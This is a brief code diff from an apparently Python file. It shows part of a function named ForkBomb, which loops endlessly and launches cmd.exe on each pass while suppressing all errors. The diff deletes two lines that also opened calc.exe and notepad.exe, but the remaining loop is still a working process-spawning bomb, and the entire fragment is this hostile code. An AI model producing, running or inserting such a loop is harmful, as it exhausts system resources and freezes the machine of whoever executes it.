@@ -7,7 +7,5 @@ def ForkBomb():
  while True:
   try:
    os.startfile('cmd.exe')
-   os.startfile('calc.exe')
-   os.startfile('notepad.exe')
   except:
    pass
